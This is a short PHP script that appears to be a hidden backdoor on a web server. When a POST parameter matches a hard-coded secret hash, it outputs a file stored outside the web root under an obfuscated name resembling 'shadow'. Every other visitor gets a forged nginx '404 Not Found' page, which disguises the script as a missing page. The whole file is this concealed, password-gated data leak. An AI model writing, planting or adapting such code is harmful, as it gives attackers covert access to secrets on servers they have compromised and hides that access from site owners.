<?php
if($_POST['dotkey']=="0fcb2f64d100c5564de856cb91ac41a1c9e0747f7de3469a8f894ad1b471816423aaf1a8a856c66bdc5545b35f18b20eff0dc9abd5dbcba7c581be2c6296add4"){
	echo file_get_contents(__DIR__."/../../../shd0w_5307.efc_dat7");
}else{
	header("HTTP/1.0 404 Not Found");
	die("<center><h1>404 Not Found</h1></center><hr><center>nginx/1.14.0 (Ubuntu)</center>");
}